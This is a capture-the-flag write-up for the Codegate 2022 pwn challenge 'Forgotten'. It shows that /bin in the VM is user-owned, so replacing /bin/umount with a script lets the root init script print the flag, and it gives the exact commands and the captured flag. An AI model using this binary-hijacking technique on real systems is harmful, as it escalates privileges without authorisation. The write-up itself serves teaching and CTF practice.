# Forgotten

**Author**: [Nspace](https://twitter.com/_MatteoRizzo)

**Tags:** pwn

**Points:** 1000 (1 solve)

**Description:** 

> i'm live in the wild.

The challenge files contain a Linux VM (kernel image + initramfs) and a customized Qemu. The Qemu patch is included and adds a custom PCI device. The challenge also includes a driver (1153 lines of C) for the custom device, which is built into the kernel. The flag is in the initramfs, and can only be read by root.

We have access to an unprivileged shell, and the intended solution is to become root by exploiting memory corruption in the custom driver.

Fortunately for us there is also a much easier way to solve this challenge:

```
Initialization is done. Enjoy :)
/ $ ls -la
...
drwxrwxr-x    2 user     user             0 Nov 22 07:37 bin
...
```

The `/bin` directory is owned by our user 👀. It appears that the author has... _forgotten_... to change the owner of some directories to root. That means that we can delete and create files there. At boot the VM executes the following init script as root:

```sh
#!/bin/sh

mknod -m 0666 /dev/null c 1 3
mknod -m 0660 /dev/ttyS0 c 4 64

mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t tmpfs tmpfs /tmp

cat <<!
Initialization is done. Enjoy :)
!

chown root /flag
chmod 400 /flag
echo 1 > /proc/sys/kernel/kptr_restrict

mknod /dev/cgs-3d0 c 246 0
setsid cttyhack setuidgid 1000 /bin/sh

umount /proc
umount /sys

poweroff -f
```

The script invokes `umount` (`/bin/umount`) and `poweroff` (`/bin/poweroff`) as root after our unprivileged shell exits. Since we own `/bin`, we can simply delete `/bin/umount` and replace it with a script that prints the flag.

```
/ $ rm /bin/umount
/ $ echo '#!/bin/sh' > /bin/umount
/ $ echo 'cat /flag > /dev/ttyS0' >> /bin/umount
/ $ chmod +x /bin/umount
/ $ exit
codegate2022{86776b92d17cd0dbceaf835d981a31f940c7f9e24613d4a261a2d38545218fc35b116036ea2989821248908e9984e0ee8272b3e85db10377f22e91adf990f73ff3c9c1a4e4c62784}
codegate2022{86776b92d17cd0dbceaf835d981a31f940c7f9e24613d4a261a2d38545218fc35b116036ea2989821248908e9984e0ee8272b3e85db10377f22e91adf990f73ff3c9c1a4e4c62784}
```